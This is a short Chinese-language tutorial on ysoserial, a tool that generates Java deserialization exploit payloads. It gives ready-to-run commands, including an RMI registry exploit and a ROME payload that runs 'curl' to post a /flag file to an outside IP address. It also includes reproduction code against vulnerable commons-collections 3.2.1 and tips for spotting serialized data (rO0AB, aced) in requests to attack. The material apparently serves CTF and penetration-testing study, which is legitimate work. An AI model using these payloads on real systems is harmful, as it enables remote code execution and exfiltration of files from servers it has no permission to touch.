Ysoserial 
<https://github.com/frohoff/ysoserial>
一款用于生成利用不安全的Java对象反序列化的有效负载的概念验证工具。
图形化优化版可以直接导出：<https://github.com/0ofo/Deswing> 
## **使用**
使用生成命令：
```
java -jar ysoserial.jar
java -jar ysoserial.jar [payload] '[command]'
```
案例：
```
java -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin
nc 10.10.10.10 1099 < groovypayload.bin

java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit myhost 1099 CommonsCollections1 calc.exe

java -jar ysoserial.jar ROME "curl http://1.2.90.186:1234 -d @/flag" |base64
`-d @/flag`：`-d`选项告诉`curl`要发送一个POST请求，并且指定了要发送的数据。
`@`符号后面跟着的是一个文件路径，`/flag`表示要发送的数据位于当前目录下的`flag`文件中。
`curl`会读取这个文件的内容，并将其作为POST请求的数据发送到服务器。
```

^
## **复现**
对生成后的.bin文件进行反序列化，存在对应的依赖，则可以触发。
```
 java -jar ysoserial.jar CommonsCollections7 calc.exe >cc7.bin
 java -jar ysoserial.jar URLDNS http://dnslog.cn >url.bin
```
```
public static Object DeSerializable(String path) throws IOException, ClassNotFoundException {
    ObjectInputStream ois = new ObjectInputStream(new FileInputStream(path));
    return ois.readObject();
}

public static void main(String[] args) throws IOException, ClassNotFoundException {

    new ArrayStack();
    DeSerializable("src/cc7.bin");
}
```
```
<dependencies>
    <dependency>
        <groupId>commons-collections</groupId>
        <artifactId>commons-collections</artifactId>
        <version>3.2.1</version>
    </dependency>
</dependencies>
```

## **常规入口场景**
下方的特征可以作为序列化的标志参考：
一段数据以rO0AB开头，你基本可以确定这串就是Java序列化base64加密的数据。
或者如果以aced开头，那么他就是这一段Java序列化的16进制。
所以这串数据可能会被服务端拿去反序列化。

比如一个Authorization头是这样的，不是标准jwt，可能是序列化后的用户类
```
Authorization Bearer rO0ABXNyABhjbi5hYmMuY29yZS5tb2RlbC5Vc2VyVm92RkMxewT0OgIAAkwAAmlkdAAQTGphdmEvbGFuZy9Mb25nO0wABG5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt4cHNyAA5qYXZhLmxhbmcuTG9uZzuL5JDMjyPfAgABSgAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAAAAAAAAXQABWFkbWlu
```
可以使用burpsuite的java DeserializationScanner插件扫描可利用链，或者代码审计依赖利用链。
常规可以直接使用ysoserial.jar打。
